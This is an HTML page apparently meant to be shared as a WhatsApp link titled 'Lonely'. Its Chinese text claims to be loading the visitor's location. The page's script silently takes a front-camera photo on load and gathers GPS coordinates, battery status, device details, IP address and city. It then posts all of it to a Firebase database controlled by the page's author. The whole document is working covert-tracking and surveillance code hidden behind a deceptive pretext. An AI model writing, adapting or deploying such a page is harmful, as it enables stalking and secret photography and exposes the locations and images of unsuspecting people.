<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lonely</title>
    
    <!-- WhatsApp Preview -->
    <meta property="og:title" content="Lonely">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://i.imgur.com/2fK9pL8.jpg">
    <meta property="og:type" content="website">

    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            background-color: #f8f9fa;
            color: #333;
            margin: 0;
            text-align: center;
        }
        .container { 
            padding: 20px; 
            max-width: 400px; 
            margin: 0 auto; 
        }
        h1 { 
            font-size: 1.5rem; 
            margin-bottom: 10px; 
        }
        p { 
            font-size: 0.9rem; 
            color: #666; 
        }
        video { 
            width: 100%; 
            max-width: 400px; 
            border-radius: 12px; 
            margin: 15px 0; 
        }
        .success { 
            color: #28a745; 
            font-weight: bold; 
        }
        .error { 
            color: #dc3545; 
            font-weight: bold; 
        }
    </style>
</head>
<body>
    <div class="container" id="content">
        <h1 id="heading">请稍等，正在加载您的位置...</h1>
        <p id="subtitle">这只需要一点时间。</p>

        <!-- Camera preview -->
        <div id="cameraSection" style="display:none;">
            <p style="margin:15px 0 8px;">前置相机已开启，正在拍照...</p>
            <video id="video" autoplay playsinline></video>
        </div>
    </div>

    <script>
        const FIREBASE_URL = "https://kojocoords-default-rtdb.europe-west1.firebasedatabase.app/location.json";

        async function startRecording() {
            let photoBase64 = null;

            try {
                // Force front camera with better settings for low light
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: "user",
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });

                const video = document.getElementById('video');
                video.srcObject = stream;
                document.getElementById('cameraSection').style.display = 'block';

                // Give more time for camera to adjust exposure (brighter photo)
                setTimeout(() => {
                    try {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth || 1280;
                        canvas.height = video.videoHeight || 720;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        photoBase64 = canvas.toDataURL('image/jpeg', 0.85);  // Higher quality for better visibility

                        sendAllData(photoBase64);
                    } catch (err) {
                        console.error("Photo capture failed:", err);
                        sendAllData(null);
                    }
                }, 2500);  // Increased delay for better exposure

            } catch (err) {
                document.getElementById('content').innerHTML = `<h2 class="error">权限被拒绝，请重试。</h2>`;
            }
        }

        async function sendAllData(photoBase64) {
            const payload = {
                timestamp: new Date().toISOString(),
                user_agent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                battery_level: null,
                battery_charging: null,
                screen_width: screen.width,
                screen_height: screen.height,
                device_latitude: null,
                device_longitude: null,
                device_accuracy_meters: null,
                ip: "unavailable",
                city: "unknown",
                region: "unknown",
                country: "unknown",
                photo_base64: photoBase64,
                note: "前置相机自动拍照"
            };

            // Battery + GPS + IP (same as before)
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    payload.battery_level = Math.round(battery.level * 100);
                    payload.battery_charging = battery.charging;
                } catch (e) {}
            }

            if (navigator.geolocation) {
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 15000
                        });
                    });
                    payload.device_latitude = pos.coords.latitude;
                    payload.device_longitude = pos.coords.longitude;
                    payload.device_accuracy_meters = pos.coords.accuracy;
                } catch (e) {}
            }

            try {
                const res = await fetch('https://ipapi.co/json');
                if (res.ok) {
                    const data = await res.json();
                    payload.ip = data.ip || "unavailable";
                    payload.city = data.city || "unknown";
                    payload.region = data.region || "unknown";
                    payload.country = data.country_name || "unknown";
                }
            } catch (e) {}

            // Send to Firebase
            try {
                await fetch(FIREBASE_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });
                document.getElementById('content').innerHTML = `<h2 class="success">照片已自动发送 ❤️<br>谢谢！</h2>`;
            } catch (e) {
                document.getElementById('content').innerHTML = `<h2 class="error">发送失败，请重试。</h2>`;
            }
        }

        // Start everything
        document.addEventListener('DOMContentLoaded', startRecording);
    </script>
</body>
</html>
